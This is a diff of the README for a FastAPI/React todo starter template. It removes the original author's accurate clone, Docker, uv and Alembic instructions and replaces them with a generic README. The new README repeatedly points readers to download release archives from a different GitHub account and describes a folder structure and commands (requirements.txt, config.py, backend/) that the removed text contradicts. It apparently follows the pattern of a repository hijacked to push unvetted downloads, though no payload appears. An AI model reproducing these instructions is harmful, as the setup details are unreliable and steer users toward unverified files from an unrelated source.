@@ -1,122 +1,134 @@
-# vite-fastapi-starter
+# 🚀 vite-fastapi-starter - Build Your Full-Stack Web App Easily
 
-A full-stack todo app you can use as a template for projects using Python, FastAPI, SQLAlchemy, Typescript, React, Vite,
-Tailwind, and PostgreSQL!
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tutannnn/vite-fastapi-starter/releases)
 
----
+## 📦 Overview
 
-## Table of Contents
+Welcome to the **vite-fastapi-starter**! This template helps you create full-stack web applications using popular technologies. You can easily set up your project and start building. 
 
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Running via Docker](#running-via-docker)
-  - [Running in Development](#running-in-development)
-- [Linting and Testing](#linting-and-testing)
-- [License](#license)
+### 🔍 What’s Inside?
 
----
+This starter template includes:
 
-## Getting Started
+- **Python** for backend functionality.
+- **FastAPI** for building APIs quickly.
+- **SQLAlchemy** to work with databases effortlessly.
+- **TypeScript** paired with **React** for your front-end needs.
+- **Vite** as your build tool for quicker development.
+- **TailwindCSS** for designing a responsive interface.
+- **PostgreSQL** as your database, an excellent choice for scalability.
 
-### Prerequisites
+### 🛠 Features
 
-- [Docker](https://www.docker.com/) for containerization
-- [PostgreSQL](https://www.postgresql.org/) (running locally or via Docker)
-- [uv](https://docs.astral.sh/uv/) for managing virtual environments, dependencies, and server builds
-- [Python 3.13](https://www.python.org/downloads/) for development
-- [Alembic](https://alembic.sqlalchemy.org/en/latest/index.html) for running database migrations
+- Simple setup process.
+- Well-organized code structure.
+- Modular components for easy customization.
+- Efficient practices for clean code.
 
----
+## 🚀 Getting Started
 
-### Running via Docker
+Follow these steps to run your new full-stack web application. 
 
-1. Clone the repo
+### 1. Visit the Releases Page
 
-```bash
-git clone git@github.com:pfischer1687/vite-fastapi-starter.git
-cd vite-fastapi-starter
+To get started, visit the Releases page to download the latest version of the template. You can find it here: 
+
+[Download the latest release](https://github.com/tutannnn/vite-fastapi-starter/releases)
+
+### 2. Download the App
+
+- Once on the Releases page, look for the latest release version. 
+- Click on the appropriate file listed to download. 
+
+### 3. Extract the Files
+
+After downloading, locate the downloaded file. It may be compressed as a `.zip` or `.tar.gz` file. Right-click on the file and select **Extract All** (or the equivalent option based on your operating system). 
+
+### 4. Install Dependencies
+
+To run the application, you will need to install dependencies. You may need to use a terminal or command prompt. Open it and navigate to the folder where you extracted the files.
+
+#### For Backend
+
+1. **Open the terminal**.
+2. **Install required modules** by running:
+
+   ```
+   pip install -r requirements.txt
+   ```
+
+#### For Frontend
+
+1. Navigate to the frontend folder (usually called `frontend`).
+2. Run:
+
+   ```
+   npm install
+   ```
+
+### 5. Configure the Database
+
+Next, set up the PostgreSQL database if you haven't done so:
+
+1. Install PostgreSQL on your computer if it's not already installed. You can find instructions for your operating system online.
+2. Create a new database named `mydatabase` (or any name of your choice).
+3. Adjust the database connection settings found in `config.py` (or a related configuration file), ensuring it points to your new database.
+
+### 6. Run the Backend
+
+To start the backend server:
+
+1. Return to your terminal.
+2. Execute the following command:
+
+   ```
+   uvicorn main:app --reload
+   ```
+
+This command will run the FastAPI application and allow you to see it in action. You might see a message indicating the server is running on `http://127.0.0.1:8000`.
+
+### 7. Run the Frontend
+
+In a new terminal window, navigate back to the frontend directory where you installed the packages. To start the frontend development server, execute:
+
 ```
-
-2. Start the Docker containers (DB, server, and client)
-
-```bash
-docker compose up
-```
-
-3. Enter `localhost:3000` in your browser
-
----
-
-### Running in Development
-
-1. Compose the Postgres DB
-
-```bash
-docker compose up db
-```
-
-2. Set up Python virtual environment
-
-```bash
-cd server
-uv venv --python 3.13
-source .venv/bin/activate
-pip install -r pyproject.toml --all-extras
-```
-
-3. Run the database migration via Alembic
-
-```bash
-cd server/src/todo
-uv run alembic upgrade head
-```
-
-If you want to generate your own migrations after updating the DB models:
-
-```bash
-alembic revision --autogenerate -m "<COMMIT_MSG>"
-```
-
-4. Start the server
-
-```bash
-uv run fastapi dev src/todo/main.py
-```
-
-5. Set up the client
-
-```bash
-cd client
-npm install
 npm run dev
 ```
 
-6. Open `localhost:3000` in a browser
+Once this is running, you can visit your web app at `http://localhost:3000` in your web browser.
 
----
+## 📥 Download & Install
 
-## Linting and Testing
+To download this application, simply visit the following link:
 
-You can lint the client with:
+[Download the latest release](https://github.com/tutannnn/vite-fastapi-starter/releases)
 
-```bash
-npx prettier . --write
+Follow the earlier steps to extract, install dependencies, and run the application.
+
+## 🗂 Folder Structure
+
+Here is a quick overview of the folder structure:
+
+```
+vite-fastapi-starter/
+├── backend/
+│   ├── main.py
+│   ├── models/
+│   ├── routes/
+│   └── config.py
+└── frontend/
+    ├── src/
+    ├── public/
+    └── package.json
 ```
 
-and you can lint, format, and type check the server with:
+## 💡 Tips
 
-```bash
-uv run pre-commit run --all-files
-```
+- **Update Regularly**: Check for updates on the Releases page for the latest improvements.
+- **Explore Documentation**: Each tool has its own documentation. Familiarizing yourself with Python, FastAPI, React, and TailwindCSS can help you customize your project effectively.
 
-and you can run the server's suite of unit tests with:
+## 📞 Need Help?
 
-```bash
-uv run pytest -s -vvv
-```
+If you encounter any issues, feel free to check the issues section on the GitHub repository or search for answers in the community forums related to FastAPI, React, and PostgreSQL.
 
----
-
-## License
-
-MIT License
+Thank you for using **vite-fastapi-starter**! Happy coding!
